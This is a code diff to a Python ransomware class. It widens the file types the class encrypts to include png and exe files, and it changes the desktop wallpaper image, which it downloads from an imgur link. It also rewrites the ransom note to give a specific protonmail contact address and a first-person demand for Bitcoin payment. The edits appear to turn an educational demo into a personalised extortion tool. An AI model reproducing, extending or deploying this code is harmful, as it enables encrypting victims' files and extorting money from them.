@@ -22,7 +22,7 @@ class RansomWare:
     
     # File exstensions to seek out and Encrypt
     file_exts = [
-        'txt',
+        'txt', 'png', 'exe',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png', 
@@ -136,9 +136,9 @@ class RansomWare:
 
 
     def change_desktop_background(self):
-        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
+        imageUrl = 'https://i.imgur.com/5Tmx0Lc.jpeg'
         # Go to specif url and download+save image using absolute path
-        path = f'{self.sysRoot}Desktop/background.jpg'
+        path = f'{self.sysRoot}Desktop/background.jpeg'
         urllib.request.urlretrieve(imageUrl, path)
         SPI_SETDESKWALLPAPER = 20
         # Access windows dlls for funcionality eg, changing dekstop wallpaper
@@ -151,15 +151,15 @@ class RansomWare:
             f.write(f'''
 The hard disks of your computer have been encrypted with an Military grade encryption algorithm.
 There is no way to restore your data without a special key.
-Only we can decrypt your files!
+Only I can decrypt your files.
 
 To purchase your key and restore your data, please follow these three easy steps:
 
-1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
+1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to vyclient@protonmail.com
 
 2. You will recieve your personal BTC address for payment.
-   Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
-   We will check to see if payment has been paid.
+   Once payment has been completed, send another email to vyclient@protonmail.com stating "PAID".
+   I will check to see if payment has been paid.
 
 3. You will receive a text file with your KEY that will unlock all your files. 
    IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
